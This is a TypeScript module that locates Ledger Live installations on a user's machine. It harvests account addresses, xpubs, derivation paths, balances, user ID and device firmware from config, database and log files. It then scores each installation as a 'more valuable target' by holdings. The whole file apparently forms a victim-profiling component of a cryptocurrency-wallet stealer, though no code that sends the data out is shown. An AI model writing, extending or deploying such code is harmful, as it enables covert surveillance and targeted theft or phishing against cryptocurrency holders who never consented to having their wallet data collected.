/**
 * Ledger Live Parser
 *
 * Extracts valuable intelligence from Ledger Live installations.
 * Even though private keys are on hardware device, Ledger Live stores:
 * - Account addresses
 * - Portfolio balances
 * - Transaction history
 * - Derivation paths
 * - Account labels
 *
 * File Locations:
 * - Windows: %APPDATA%/Ledger Live/
 * - macOS: ~/Library/Application Support/Ledger Live/
 * - Linux: ~/.config/Ledger Live/
 *
 * Key Files:
 * - app.json: Configuration
 * - app.db: SQLite database with accounts
 */

import { readFileSync, readdirSync, existsSync, statSync } from "fs"
import path from "path"

// Optional SQLite support - gracefully degrade if not available
let Database: any = null
try {
  Database = require("better-sqlite3")
} catch (err) {
  console.log("ℹ️  better-sqlite3 not available, SQLite parsing will be skipped")
}

export interface LedgerAccount {
  id: string
  name: string
  currency: string // BTC, ETH, SOL, etc.
  address: string
  derivation_path: string
  balance: string // In native units
  balance_usd?: string
  account_index: number
  fresh_address?: string // For BTC/UTXO chains
  operations_count?: number // Transaction count
  last_sync?: string
}

export interface LedgerLiveData {
  installation_path: string
  app_version?: string
  user_id?: string
  accounts: LedgerAccount[]
  total_accounts: number
  total_balance_usd?: string
  currencies: string[] // Unique list of currencies
  device_info?: {
    model?: string // Nano S, Nano X, Nano S Plus
    firmware_version?: string
  }
  last_used?: string
  settings?: any
}

/**
 * Known Ledger Live installation paths
 */
const LEDGER_LIVE_PATHS = {
  windows: [
    "AppData/Roaming/Ledger Live",
    "AppData/Local/Ledger Live"
  ],
  macos: [
    "Library/Application Support/Ledger Live",
    ".config/Ledger Live"
  ],
  linux: [
    ".config/Ledger Live",
    ".local/share/Ledger Live"
  ]
}

/**
 * Parse Ledger Live installation
 */
export function parseLedgerLive(userProfilePath: string): LedgerLiveData | null {
  console.log("🔍 Searching for Ledger Live installation...")

  // Try all known paths
  const possiblePaths = [
    ...LEDGER_LIVE_PATHS.windows.map(p => path.join(userProfilePath, p)),
    ...LEDGER_LIVE_PATHS.macos.map(p => path.join(userProfilePath, p)),
    ...LEDGER_LIVE_PATHS.linux.map(p => path.join(userProfilePath, p))
  ]

  for (const ledgerPath of possiblePaths) {
    if (existsSync(ledgerPath)) {
      console.log(`✅ Found Ledger Live at: ${ledgerPath}`)

      try {
        const data = parseLedgerLiveDirectory(ledgerPath)
        if (data && data.accounts.length > 0) {
          return data
        }
      } catch (err) {
        console.error(`⚠️  Error parsing Ledger Live: ${err}`)
      }
    }
  }

  console.log("ℹ️  Ledger Live not found")
  return null
}

/**
 * Parse Ledger Live directory
 */
function parseLedgerLiveDirectory(ledgerPath: string): LedgerLiveData {
  const data: LedgerLiveData = {
    installation_path: ledgerPath,
    accounts: [],
    total_accounts: 0,
    currencies: []
  }

  // Parse app.json configuration
  const appJsonPath = path.join(ledgerPath, "app.json")
  if (existsSync(appJsonPath)) {
    try {
      const appJson = JSON.parse(readFileSync(appJsonPath, "utf-8"))

      data.app_version = appJson.data?.appVersion
      data.user_id = appJson.data?.user?.id
      data.settings = appJson.data?.settings
      data.last_used = appJson.data?.lastUsed

      // Extract accounts from app.json (newer format)
      if (appJson.data?.accounts && Array.isArray(appJson.data.accounts)) {
        for (const account of appJson.data.accounts) {
          const parsedAccount = parseAccountFromJson(account)
          if (parsedAccount) {
            data.accounts.push(parsedAccount)
          }
        }
      }

      console.log(`✅ Parsed app.json: ${data.accounts.length} accounts found`)
    } catch (err) {
      console.error(`⚠️  Failed to parse app.json: ${err}`)
    }
  }

  // Parse SQLite database (older format or additional data)
  const dbPath = path.join(ledgerPath, "app.db")
  if (existsSync(dbPath)) {
    try {
      const dbAccounts = parseAccountsDatabase(dbPath)

      // Merge with accounts from app.json (avoid duplicates)
      for (const dbAccount of dbAccounts) {
        if (!data.accounts.find(a => a.id === dbAccount.id || a.address === dbAccount.address)) {
          data.accounts.push(dbAccount)
        }
      }

      console.log(`✅ Parsed app.db: ${dbAccounts.length} additional accounts`)
    } catch (err) {
      console.error(`⚠️  Failed to parse app.db: ${err}`)
    }
  }

  // Calculate statistics
  data.total_accounts = data.accounts.length
  data.currencies = [...new Set(data.accounts.map(a => a.currency))]

  // Calculate total balance (if available)
  const balances = data.accounts
    .filter(a => a.balance_usd)
    .map(a => parseFloat(a.balance_usd!))

  if (balances.length > 0) {
    data.total_balance_usd = balances.reduce((sum, b) => sum + b, 0).toFixed(2)
  }

  // Try to detect device info from logs or cache
  try {
    const logsPath = path.join(ledgerPath, "logs")
    if (existsSync(logsPath)) {
      const logFiles = readdirSync(logsPath).filter(f => f.endsWith(".log"))
      if (logFiles.length > 0) {
        const latestLog = path.join(logsPath, logFiles[logFiles.length - 1])
        const logContent = readFileSync(latestLog, "utf-8")

        // Extract device model from logs
        const modelMatch = logContent.match(/device.*?(Nano S Plus|Nano X|Nano S)/i)
        if (modelMatch) {
          data.device_info = { model: modelMatch[1] }
        }

        // Extract firmware version
        const fwMatch = logContent.match(/firmware.*?(\d+\.\d+\.\d+)/i)
        if (fwMatch) {
          if (!data.device_info) data.device_info = {}
          data.device_info.firmware_version = fwMatch[1]
        }
      }
    }
  } catch (err) {
    // Logs parsing is optional
  }

  return data
}

/**
 * Parse account from app.json format
 */
function parseAccountFromJson(account: any): LedgerAccount | null {
  try {
    // Extract address (different formats for different currencies)
    let address = account.freshAddress || account.xpub || account.address

    // For UTXO chains (BTC), use xpub or first address
    if (account.currency === "bitcoin" && account.xpub) {
      address = account.xpub
    }

    if (!address) {
      // Try to extract from operations
      if (account.operations && account.operations.length > 0) {
        const firstOp = account.operations[0]
        address = firstOp.recipients?.[0] || firstOp.senders?.[0]
      }
    }

    const parsedAccount: LedgerAccount = {
      id: account.id || `${account.currency}_${account.index}`,
      name: account.name || `${account.currency.toUpperCase()} Account ${account.index + 1}`,
      currency: mapCurrencyId(account.currency),
      address: address || "unknown",
      derivation_path: account.derivationPath || account.path || "",
      balance: account.balance || "0",
      account_index: account.index || 0,
      operations_count: account.operations?.length || account.operationsCount || 0
    }

    // Calculate USD balance if available
    if (account.balanceHistory && account.balanceHistory.length > 0) {
      const latestBalance = account.balanceHistory[account.balanceHistory.length - 1]
      if (latestBalance && latestBalance.value) {
        parsedAccount.balance_usd = latestBalance.value
      }
    }

    // Store fresh address for UTXO chains
    if (account.freshAddress) {
      parsedAccount.fresh_address = account.freshAddress
    }

    // Last sync time
    if (account.lastSyncDate) {
      parsedAccount.last_sync = new Date(account.lastSyncDate).toISOString()
    }

    return parsedAccount
  } catch (err) {
    console.error(`⚠️  Failed to parse account: ${err}`)
    return null
  }
}

/**
 * Parse accounts from SQLite database
 */
function parseAccountsDatabase(dbPath: string): LedgerAccount[] {
  const accounts: LedgerAccount[] = []

  // Check if SQLite support is available
  if (!Database) {
    console.log("ℹ️  SQLite support not available, skipping app.db parsing")
    return accounts
  }

  try {
    const db = new Database(dbPath, { readonly: true, fileMustExist: true })

    // Try to query accounts table
    const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all() as any[]

    if (tables.find(t => t.name === 'accounts')) {
      const rows = db.prepare("SELECT * FROM accounts").all() as any[]

      for (const row of rows) {
        try {
          // Data is usually stored as JSON in a column
          const accountData = typeof row.data === 'string' ? JSON.parse(row.data) : row

          const account = parseAccountFromJson(accountData)
          if (account) {
            accounts.push(account)
          }
        } catch (err) {
          // Skip invalid rows
        }
      }
    }

    db.close()
  } catch (err) {
    console.error(`⚠️  Failed to open SQLite database: ${err}`)
  }

  return accounts
}

/**
 * Map Ledger currency IDs to standard symbols
 */
function mapCurrencyId(currencyId: string): string {
  const mapping: Record<string, string> = {
    'bitcoin': 'BTC',
    'ethereum': 'ETH',
    'litecoin': 'LTC',
    'dogecoin': 'DOGE',
    'bitcoin_cash': 'BCH',
    'dash': 'DASH',
    'zcash': 'ZEC',
    'ripple': 'XRP',
    'stellar': 'XLM',
    'cosmos': 'ATOM',
    'tezos': 'XTZ',
    'polkadot': 'DOT',
    'solana': 'SOL',
    'cardano': 'ADA',
    'polygon': 'MATIC',
    'binance_smart_chain': 'BNB',
    'avalanche_c_chain': 'AVAX',
    'fantom': 'FTM',
    'optimism': 'OP',
    'arbitrum': 'ARB'
  }

  return mapping[currencyId.toLowerCase()] || currencyId.toUpperCase()
}

/**
 * Detect if Ledger Live is installed (quick check)
 */
export function hasLedgerLive(userProfilePath: string): boolean {
  const possiblePaths = [
    ...LEDGER_LIVE_PATHS.windows.map(p => path.join(userProfilePath, p)),
    ...LEDGER_LIVE_PATHS.macos.map(p => path.join(userProfilePath, p)),
    ...LEDGER_LIVE_PATHS.linux.map(p => path.join(userProfilePath, p))
  ]

  return possiblePaths.some(p => existsSync(p))
}

/**
 * Calculate risk score for Ledger Live installation
 * Higher score = more valuable target
 */
export function calculateLedgerRiskScore(data: LedgerLiveData): number {
  let score = 0

  // Base score for having Ledger
  score += 30

  // Accounts
  score += Math.min(30, data.total_accounts * 3) // +3 per account, max 30

  // Currencies (diversification indicates sophistication)
  score += Math.min(20, data.currencies.length * 4) // +4 per currency, max 20

  // Balance (if available)
  if (data.total_balance_usd) {
    const balance = parseFloat(data.total_balance_usd)
    if (balance > 100000) score += 20 // $100k+
    else if (balance > 10000) score += 15 // $10k+
    else if (balance > 1000) score += 10 // $1k+
    else if (balance > 100) score += 5 // $100+
  }

  return Math.min(100, score)
}
